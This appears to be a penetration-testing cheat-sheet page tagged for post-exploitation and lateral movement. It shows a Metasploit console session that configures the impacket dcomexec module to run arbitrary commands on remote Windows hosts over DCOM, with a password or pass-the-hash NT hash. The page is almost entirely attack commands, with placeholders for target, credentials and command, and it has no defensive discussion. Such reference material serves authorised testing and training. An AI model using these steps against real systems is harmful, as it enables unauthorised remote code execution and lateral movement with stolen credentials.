---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - T1021-003
  - network-protocols
  - msrpc
  - metasploit-framework
  - windows
---
# Metasploit

```
msf > use auxiliary/scanner/smb/impacket/dcomexec

msf auxiliary(scanner/smb/impacket/dcomexec) > options

Module options (auxiliary/scanner/smb/impacket/dcomexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     yes       The command to execute
   OBJECT     MMC20            yes       The DCOM object to use for execution (Accepted: ShellWindows, ShellBrowserWindow, MMC20)
   OUTPUT     true             yes       Get the output of the executed command
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     yes       The password for the specified username
   SMBUser                     yes       The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf auxiliary(scanner/smb/impacket/dcomexec) > set command <commands>

msf auxiliary(scanner/smb/impacket/dcomexec) > set object <MMC20 | ShellBrowserWindow | ShellWindows>

msf auxiliary(scanner/smb/impacket/dcomexec) > set output true

msf auxiliary(scanner/smb/impacket/dcomexec) > set rhosts <target_IP>

msf auxiliary(scanner/smb/impacket/dcomexec) > set smbuser <username>

msf auxiliary(scanner/smb/impacket/dcomexec) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf auxiliary(scanner/smb/impacket/dcomexec) > set smbdomain <domain>

msf auxiliary(scanner/smb/impacket/dcomexec) > set threads 2

msf auxiliary(scanner/smb/impacket/dcomexec) > run
```